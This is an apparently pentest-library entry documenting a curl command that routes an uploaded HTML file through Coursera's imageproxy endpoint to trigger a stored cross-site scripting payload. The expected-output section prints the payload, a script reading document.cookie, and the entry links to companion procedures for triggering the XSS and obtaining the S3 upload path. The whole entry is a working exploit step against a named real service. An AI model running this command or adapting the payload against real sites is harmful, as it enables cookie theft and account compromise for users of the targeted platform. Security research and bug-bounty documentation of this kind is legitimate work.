---
id: g7h8i9j0-k1l2-3456-ghij-789012345678
data: >-
  curl
  "https://www.coursera.org/api/utilities/v1/imageproxy/http://coursera-profile-photos.s3.amazonaws.com/[redacted]/stored_xss.html"
tags:
  - xss
  - proxy
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:16:02.929Z'
verified: false
validated: true
submitted: true
---
# coursera-imageproxy-fetch-malicious-file

## Command

```bash
curl "https://www.coursera.org/api/utilities/v1/imageproxy/http://coursera-profile-photos.s3.amazonaws.com/[redacted]/stored_xss.html"
```

## Description

Fetches the malicious HTML through Coursera's imageproxy, which renders it and executes the XSS payload when viewed.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL param | Full S3 URL of malicious file | Yes |
| `[redacted]` | Path in S3 bucket | Yes |

## Examples

### Basic Usage

```bash
curl "https://www.coursera.org/api/utilities/v1/imageproxy/http://coursera-profile-photos.s3.amazonaws.com/path/stored_xss.html"
```

### Advanced Usage

Use in browser for JS execution; curl for content verification.

## Expected Output

Raw HTML response: <html><script>alert(document.cookie);</script></html>

## Related

- [[procedures/Trigger-XSS-via-Coursera-Imageproxy]]
- [[procedures/Retrieve-S3-URL-from-Transloadit]]
